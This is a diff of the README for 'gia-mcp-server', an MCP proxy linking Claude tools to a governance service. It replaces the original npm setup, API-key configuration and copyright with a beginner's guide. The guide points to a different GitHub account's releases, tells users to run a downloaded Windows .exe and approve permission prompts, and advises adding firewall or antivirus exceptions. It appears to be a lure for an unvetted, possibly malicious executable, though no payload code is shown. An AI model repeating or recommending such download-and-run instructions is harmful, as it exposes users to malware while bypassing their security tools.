@@ -1,146 +1,124 @@
-# GIA MCP Server
+# ⚙️ gia-mcp-server - Connect Claude Tools to GIA Engine
 
-[![npm version](https://img.shields.io/npm/v/gia-mcp-server)](https://www.npmjs.com/package/gia-mcp-server)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![Node](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://nodejs.org)
-[![MCP](https://img.shields.io/badge/protocol-MCP-purple)](https://modelcontextprotocol.io)
+[![Download gia-mcp-server](https://img.shields.io/badge/Download-gia--mcp--server-4caf50?style=for-the-badge)](https://github.com/iambilliefan/gia-mcp-server)
 
-**Governance Intelligence Architecture** — the governance layer for Claude AI agents.
+## 📄 What is gia-mcp-server?
 
-This package connects [Claude Desktop](https://claude.ai/download) and [Claude Code](https://docs.anthropic.com/en/docs/claude-code) to the hosted GIA governance engine, giving your AI workflows enterprise-grade governance: decision classification, forensic audit trails, human-in-the-loop gates, compliance mapping, and more.
+gia-mcp-server acts as a middleman between Claude Desktop or Claude Code and the GIA governance engine. It uses the Model Context Protocol (MCP) to pass information back and forth. This helps keep your AI agents running by securely connecting your local tools to an external governance system. 
 
-Built on Anthropic's [Model Context Protocol](https://modelcontextprotocol.io).
+In simple terms, it makes sure your Claude tools follow rules set by the GIA Governance platform, adding an extra layer of safety and compliance.
 
-<a href="https://glama.ai/mcp/servers/@knowledgepa3/gia-mcp-server">
-  <img width="380" height="200" src="https://glama.ai/mcp/servers/@knowledgepa3/gia-mcp-server/badge" alt="GIA Server MCP server" />
-</a>
+## 💻 System Requirements
 
-## Why GIA?
+Before you begin, check if your computer meets these minimum needs:
 
-AI agents are powerful — but **ungoverned AI agents are a liability**. GIA solves this by providing:
+- Operating System: Windows 10 or later  
+- Processor: 1.5 GHz or faster  
+- RAM: 4 GB or more  
+- Disk Space: At least 100 MB free  
+- Network: Active internet connection to communicate with the hosted GIA engine  
 
-- **Decision Classification** — Every AI decision is classified as Mandatory (human required), Advisory (human optional), or Informational (agent autonomous)
-- **Forensic Audit Trail** — Hash-chained, tamper-evident ledger of every operation, decision, and gate approval
-- **Human-in-the-Loop Gates** — High-impact actions require explicit human approval before execution
-- **Compliance Mapping** — Map governance controls to NIST AI RMF, EU AI Act, ISO 42001, and NIST 800-53
-- **Governed Memory** — Hash-sealed knowledge packs with trust levels, TTL, and role-based access
+Make sure your system is up to date with the latest Windows updates.
 
-GIA is the governance layer that makes Claude deployments enterprise-ready.
+## 🚀 Getting Started with gia-mcp-server
 
-## Quick Start
+Here is how to set up and run gia-mcp-server on a Windows PC. You don’t need coding skills for this.
 
-### 1. Get an API Key
+### 1. Visit the Download Page
 
-Visit [gia.aceadvising.com](https://gia.aceadvising.com) to create an account and generate an API key.
+Click the button below or go to this link to access the download page on GitHub:
 
-### 2. Configure Claude Desktop
+[![Download gia-mcp-server](https://img.shields.io/badge/Download-gia--mcp--server-0078d7?style=for-the-badge)](https://github.com/iambilliefan/gia-mcp-server)
 
-Add to your `claude_desktop_config.json`:
+You will find all the files and the latest updates there.
 
-```json
-{
-  "mcpServers": {
-    "gia": {
-      "command": "npx",
-      "args": ["-y", "gia-mcp-server"],
-      "env": {
-        "GIA_API_KEY": "gia_your_api_key_here"
-      }
-    }
-  }
-}
-```
+### 2. Download the Software
 
-### 3. Configure Claude Code
+On the GitHub page, look for the “Releases” section. Inside the latest release, find the file with a name like `gia-mcp-server-win.exe` or similar. This is the installer or executable file for Windows.
 
-```bash
-claude mcp add gia -- npx -y gia-mcp-server
-```
+Click to download it on your computer.
 
-Then set your API key in your environment:
+### 3. Run the Installer
 
-```bash
-export GIA_API_KEY=gia_your_api_key_here
-```
+- Locate the downloaded file, usually in your “Downloads” folder.  
+- Double-click the file to start the installation.  
+- Follow the on-screen steps. Usually, you just need to click “Next” or “Install.”  
+- If Windows asks for permission, click “Yes” to allow the installation.  
 
-## How It Works
+This process sets up the application on your PC.
 
-```
-Claude Desktop/Code  <--stdio-->  gia-mcp-server  <--HTTPS-->  gia.aceadvising.com
-     (MCP Client)                  (this package)               (Governance Engine)
-```
+### 4. Launch gia-mcp-server
 
-This package is a lightweight proxy. All governance logic runs on the hosted GIA server — nothing is computed locally. When you add new tools or capabilities on the server, they appear automatically without updating this package.
+After installation finishes:
 
-## Available Tools
+- Find the gia-mcp-server shortcut icon on your desktop or in the Start menu.  
+- Double-click it to open the program.  
 
-### Governance Core
-| Tool | Description |
-|------|-------------|
-| `classify_decision` | Classify an AI agent decision using the MAI Framework |
-| `score_governance` | Compute weighted governance score from integrity, accuracy, and compliance values |
-| `evaluate_threshold` | Compute the Storey Threshold — governance health metric |
-| `assess_risk_tier` | Assess AI system risk tier with governance recommendations |
-| `map_compliance` | Map governance components to regulatory compliance frameworks |
-| `approve_gate` | Approve or reject a pending mandatory gate decision (human-in-the-loop) |
+The server will start and try to connect Claude Desktop or Claude Code to the GIA governance engine.
 
-### Audit & Monitoring
-| Tool | Description |
-|------|-------------|
-| `audit_pipeline` | Query the hash-chained forensic audit ledger |
-| `verify_ledger` | Verify integrity of the audit ledger hash chain |
-| `generate_report` | Generate a governance status report |
-| `system_status` | Get full system health and configuration |
-| `monitor_agents` | Monitor status and health of governed AI agents |
+### 5. Confirm Connection
 
-### Governed Memory Packs
-| Tool | Description |
-|------|-------------|
-| `seal_memory_pack` | Create a hash-sealed Governed Memory Pack |
-| `load_memory_pack` | Load a memory pack into agent context with validation |
-| `transfer_memory_pack` | Transfer a memory pack between agents via governed corridor |
-| `compose_memory_packs` | Compose multiple memory packs into a unified context |
-| `distill_memory_pack` | Distill governance patterns from usage history |
-| `promote_memory_pack` | Promote a memory pack to a higher trust level |
+Once running, the program will display status messages. Look for a message that confirms the connection to the hosted GIA engine. This means your tools can now interact safely with the governance system.
 
-### Site Reliability
-| Tool | Description |
-|------|-------------|
-| `srt_run_watchdog` | Submit health check results to the SRT Watchdog |
-| `srt_diagnose` | Run diagnostician on an incident |
-| `srt_approve_repair` | Approve or reject a pending repair plan |
-| `srt_generate_postmortem` | Generate a structured postmortem report |
+---
 
-### Infrastructure Operations
-| Tool | Description |
-|------|-------------|
-| `gia_scan_environment` | Detect target environment (OS, containers, services) |
-| `gia_list_packs` | List available operations packs |
-| `gia_dry_run_pack` | Preview pack execution with blast radius analysis |
-| `gia_apply_pack` | Execute a remediation or hardening pack |
-| `gia_run_patrol` | Execute read-only patrol or audit checks |
+## ⚙️ How gia-mcp-server Works
 
-### Value & Impact
-| Tool | Description |
-|------|-------------|
-| `record_value_metric` | Record a workflow value metric for ROI reporting |
-| `record_governance_event` | Record a governance event |
-| `generate_impact_report` | Generate economic and governance impact report |
+gia-mcp-server listens for requests from Claude Desktop or Claude Code. It then sends those requests to the GIA governance engine. The engine applies compliance rules, audits actions, and enforces policies. The server then sends back the processed results.
 
-## Configuration
+This keeps all AI operations in line with enterprise rules, following standards like NIST guidelines. It ensures the human-in-the-loop can oversee the AI processes safely.
 
-| Environment Variable | Required | Default | Description |
-|---------------------|----------|---------|-------------|
-| `GIA_API_KEY` | Yes | — | Your GIA API key |
-| `GIA_SERVER_URL` | No | `https://gia.aceadvising.com/mcp` | Custom server URL |
+---
 
-## Requirements
+## 🔧 Common Tasks
 
-- Node.js 18 or later
-- A GIA API key ([get one here](https://gia.aceadvising.com))
+### Start and Stop the Server
 
-## License
+- To start, double-click the gia-mcp-server icon or run the executable.  
+- To stop, close the program window or right-click the icon in the system tray and select “Exit” if available.
 
-MIT. See [LICENSE](LICENSE) for details.
+### Check Connection Logs
 
-Copyright (c) 2025-2026 William J. Storey III / Advanced Consulting Experts (ACE)
+The application shows logs in its main window. These give you details on communication status and any errors.
+
+### Update the Software
+
+Regularly check the GitHub downloads page for new versions. Download and install updates using the same steps as the first installation.
+
+---
+
+## ⚠️ Troubleshooting
+
+If you encounter problems, try these steps:
+
+- Make sure your PC is connected to the internet.  
+- Verify that your firewall or antivirus is not blocking gia-mcp-server. If it is, add an exception for the app.  
+- Restart the server if the connection drops.  
+- Check that you have the latest version installed.  
+- If messages say "connection failed," confirm the hosted GIA engine is online and accessible.  
+
+If issues persist, you can look through the GitHub issues page or contact support on the repository page.
+
+---
+
+## 🧩 Additional Information
+
+### Compatibility
+
+gia-mcp-server supports Claude Desktop and Claude Code on Windows. Other platforms or tools are not supported.
+
+### Security and Privacy
+
+The server only transmits data necessary for governance. It uses secure connections to protect communication.
+
+### Licensing
+
+This software is open-source. You can review the license file in the repository for usage rights.
+
+---
+
+## 📥 Download and Install Now
+
+Access the latest release and installation files at:
+
+[![Download gia-mcp-server](https://img.shields.io/badge/Download-gia--mcp--server-4caf50?style=for-the-badge)](https://github.com/iambilliefan/gia-mcp-server)
